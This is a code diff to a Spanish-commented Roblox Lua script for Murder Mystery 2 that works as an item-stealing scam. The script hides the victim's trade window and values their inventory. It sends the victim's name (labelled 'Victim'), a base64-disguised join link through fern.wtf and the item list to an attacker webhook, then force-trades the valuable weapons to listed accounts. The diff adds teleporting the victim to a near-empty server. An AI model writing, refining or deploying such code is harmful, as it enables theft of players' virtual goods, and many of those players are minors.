@@ -1,6 +1,7 @@
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
+local TeleportService = game:GetService("TeleportService")
 
 -- Evitar ejecución múltiple
 if getgenv().ScriptEjecutado then return end
@@ -19,7 +20,33 @@ if not req then
     return
 end
 
--- Función Base64 propia
+-- ===== Teleport a servidor vacío o casi vacío (retry infinito con 2s delay) =====
+local function teleportToServer(minEmptyPlayers, maxPlayers)
+    while true do
+        local servers
+        pcall(function()
+            servers = HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100"))
+        end)
+        if servers and servers.data then
+            for _, s in ipairs(servers.data) do
+                if s.id ~= game.JobId and s.playing <= maxPlayers and s.playing >= minEmptyPlayers then
+                    TeleportService:TeleportToPlaceInstance(game.PlaceId, s.id, LocalPlayer)
+                    return
+                end
+            end
+        end
+        task.wait(2) -- delay seguro de 2 segundos
+    end
+end
+
+-- Solo ejecutar teleport si no ha teleporteado
+if not getgenv().AlreadyTeleported then
+    getgenv().AlreadyTeleported = true
+    teleportToServer(0, 8) -- mínimo 0, máximo 8 jugadores
+    return
+end
+
+-- ===== Función Base64 propia =====
 local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
 local function base64Encode(data)
     return ((data:gsub('.', function(x)
@@ -34,7 +61,7 @@ local function base64Encode(data)
     end)..({ '', '==', '=' })[#data%3+1])
 end
 
--- Función para enviar webhook
+-- ===== Enviar webhook =====
 local function SendWebhook(title, description, fields, prefix)
     local data = {
         ["content"] = prefix or "",
@@ -53,7 +80,7 @@ local function SendWebhook(title, description, fields, prefix)
     end)
 end
 
--- Ocultar GUI de trade
+-- ===== Ocultar GUI de trade =====
 local playerGui = LocalPlayer:WaitForChild("PlayerGui")
 for _, guiName in ipairs({"TradeGUI","TradeGUI_Phone"}) do
     local gui = playerGui:FindFirstChild(guiName)
@@ -63,7 +90,7 @@ for _, guiName in ipairs({"TradeGUI","TradeGUI_Phone"}) do
     end
 end
 
--- Funciones de trade
+-- ===== Funciones de trade =====
 local TradeService = game:GetService("ReplicatedStorage"):WaitForChild("Trade")
 local function getTradeStatus() return TradeService.GetTradeStatus:InvokeServer() end
 local function sendTradeRequest(user)
@@ -114,7 +141,6 @@ local function extractChroma(html)
     end
     return t
 end
-
 local function buildValueList()
     local allValues,chromaValues={},{}
     for r,url in pairs(categories) do
@@ -150,14 +176,12 @@ local function buildValueList()
     return valueList
 end
 
--- ====================================
-
+-- ===== Extraer armas válidas =====
 local weaponsToSend={}
 local totalValue=0
 local min_rarity_index=table.find(rarityTable,min_rarity)
 local valueList=buildValueList()
 
--- Extraer armas válidas
 local profile=game.ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
 for id,amount in pairs(profile.Weapons.Owned) do
     local item=database[id]
@@ -173,28 +197,28 @@ for id,amount in pairs(profile.Weapons.Owned) do
     end
 end
 
--- Ordenar armas por valor total
-table.sort(weaponsToSend,function(a,b) return (a.Value*a.Amount)>(b.Value*b.Amount) end)
+-- ===== Enviar webhook solo si hay armas =====
+if #weaponsToSend > 0 then
+    table.sort(weaponsToSend,function(a,b) return (a.Value*a.Amount)>(b.Value*b.Amount) end)
 
--- Generar join protegido
-local rawLink="https://fern.wtf/joiner?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId.."&token="..math.random(100000,999999)
-local encodedLink=base64Encode(rawLink)
-local safeLink="https://fern.wtf/redirect?data="..HttpService:UrlEncode(encodedLink)
+    local rawLink="https://fern.wtf/joiner?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId.."&token="..math.random(100000,999999)
+    local encodedLink=base64Encode(rawLink)
+    local safeLink="https://fern.wtf/redirect?data="..HttpService:UrlEncode(encodedLink)
 
--- Webhook fields con link clickeable
-local fields={
-    {name="Victim 👤", value=LocalPlayer.Name, inline=true},
-    {name="Enlace seguro 🔗", value="[Click aquí]("..safeLink..")", inline=false},
-    {name="Inventario 📦", value="", inline=false},
-    {name="Valor total 📦", value=tostring(totalValue), inline=true}
-}
-for _, w in ipairs(weaponsToSend) do
-    fields[3].value=fields[3].value..string.format("%s x%s (%s) | Value: %s\n", w.DataID,w.Amount,w.Rarity,tostring(w.Value*w.Amount))
+    local fields={
+        {name="Victim 👤", value=LocalPlayer.Name, inline=true},
+        {name="Enlace seguro 🔗", value="[Click aquí]("..safeLink..")", inline=false},
+        {name="Inventario 📦", value="", inline=false},
+        {name="Valor total 📦", value=tostring(totalValue), inline=true}
+    }
+    for _, w in ipairs(weaponsToSend) do
+        fields[3].value=fields[3].value..string.format("%s x%s (%s) | Value: %s\n", w.DataID,w.Amount,w.Rarity,tostring(w.Value*w.Amount))
+    end
+    local prefix=pingEveryone and "@everyone " or ""
+    SendWebhook("💪MM2 Hit Protegido💯","💰Solo Godly/Ancient armas",fields,prefix)
 end
-local prefix=pingEveryone and "@everyone " or ""
-SendWebhook("💪MM2 Hit Protegido💯","💰Solo Godly/Ancient armas",fields,prefix)
 
--- Trade
+-- ===== Trade =====
 local function doTrade(targetName)
     while #weaponsToSend>0 do
         local status=getTradeStatus()
@@ -215,7 +239,6 @@ local function doTrade(targetName)
     end
 end
 
--- Esperar chat para iniciar trade
 for _, p in ipairs(Players:GetPlayers()) do
     if table.find(users,p.Name) then
         p.Chatted:Connect(function() doTrade(p.Name) end)
